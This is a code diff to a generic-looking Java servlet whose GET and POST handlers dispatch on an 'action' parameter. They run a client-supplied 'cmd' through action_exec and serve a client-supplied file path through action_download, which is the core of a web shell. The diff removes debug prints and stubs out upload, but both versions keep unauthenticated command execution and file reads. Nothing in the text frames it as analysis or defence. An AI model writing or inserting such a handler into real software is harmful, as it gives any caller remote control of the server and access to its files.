@@ -25,17 +25,16 @@ public class MyServlet extends HttpServlet {
     protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
         String action = request.getParameter("action");
 
-        if ("exec".equals(action)) {
-            System.out.println("exec");
+        if (action.equals("exec")) {
             String cmd = request.getParameter("cmd");
             action_exec(response, cmd);
-        } else if ("download".equals(action)) {
-            System.out.println("download");
+        } else if (action.equals("download")) {
             String path = request.getParameter("path");
             action_download(response, path);
-        } else if ("upload".equals(action)) {
-            System.out.println("upload");
-            String path = request.getParameter("path");
+        } else if (action.equals("upload")) {
+            // TODO
+            // String path = request.getParameter("path");
+            // action_upload(response, path);
         }
     }
 
@@ -43,17 +42,16 @@ public class MyServlet extends HttpServlet {
     protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
         String action = request.getParameter("action");
 
-        if ("exec".equals(action)) {
-            System.out.println("exec");
+        if (action.equals("exec")) {
             String cmd = request.getParameter("cmd");
             action_exec(response, cmd);
-        } else if ("download".equals(action)) {
-            System.out.println("download");
+        } else if (action.equals("download")) {
             String path = request.getParameter("path");
             action_download(response, path);
-        } else if ("upload".equals(action)) {
-            System.out.println("upload");
-            String path = request.getParameter("path");
+        } else if (action.equals("upload")) {
+            // TODO
+            // String path = request.getParameter("path");
+            // action_upload(response, path);
         }
     }
 
